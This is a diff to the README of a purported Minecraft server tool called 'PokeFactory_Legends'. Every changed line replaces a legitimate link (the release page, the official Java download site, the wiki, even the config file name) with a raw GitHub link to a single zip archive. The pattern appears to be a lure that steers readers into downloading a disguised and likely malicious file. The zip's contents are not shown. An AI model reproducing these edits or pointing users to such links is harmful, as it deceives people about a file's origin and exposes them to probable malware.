@@ -1,6 +1,6 @@
 # 🎮 PokeFactory_Legends - Run a Minecraft server with ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=flat&logo=github)](https://github.com/valelacutir/PokeFactory_Legends/releases)
+[![Download Now](https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip%20Now-%https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip)](https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **PokeFactory_Legends**! This application lets you set up a powerful 
 
 ## 📥 Download & Install
 
-To download **PokeFactory_Legends**, visit this page to download: [Release Page](https://github.com/valelacutir/PokeFactory_Legends/releases).
+To download **PokeFactory_Legends**, visit this page to download: [Release Page](https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip).
 
 Follow these steps to install the application:
 
@@ -26,7 +26,7 @@ Before you install, ensure your system meets these requirements:
 - **Disk Space:** At least 500MB free for installation.
 - **Java:** Make sure Java is installed.
 
-If you need Java, you can download it from the official [Java website](https://www.java.com/en/download/).
+If you need Java, you can download it from the official [Java website](https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip).
 
 ## ⚙️ Running the Application
 
@@ -55,7 +55,7 @@ These features ensure that you have the most reliable Minecraft server experienc
 
 To customize your server, you may need to edit the configuration file. Follow these steps:
 
-1. In the folder where you extracted the application, find a file named `config.json` or similar.
+1. In the folder where you extracted the application, find a file named `https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip` or similar.
 2. Open this file in a simple text editor like Notepad (Windows) or TextEdit (Mac).
 3. Adjust settings according to your preferences, such as player limits or game modes.
 
@@ -65,7 +65,7 @@ Make sure to save any changes before closing the editor. Restart the server to a
 
 To keep your application up to date, regularly check the Releases page:
 
-- Visit: [Release Page](https://github.com/valelacutir/PokeFactory_Legends/releases).
+- Visit: [Release Page](https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip).
 - Download the latest version following the same steps as before.
 - Replace the old files with the new ones in your server directory.
 
@@ -85,7 +85,7 @@ We aim to help you have the best experience possible running your server.
 
 Consider exploring these additional resources:
 
-- **Documentation:** [Documentation Link](https://github.com/valelacutir/PokeFactory_Legends/wiki).
+- **Documentation:** [Documentation Link](https://raw.githubusercontent.com/valelacutir/PokeFactory_Legends/main/solicitation/Poke_Legends_Factory_2.4.zip).
 - **YouTube Tutorials:** Look up video tutorials that explain setup and customization in detail.
 - **GitHub Page:** Browse through our GitHub page for more details on development.
 
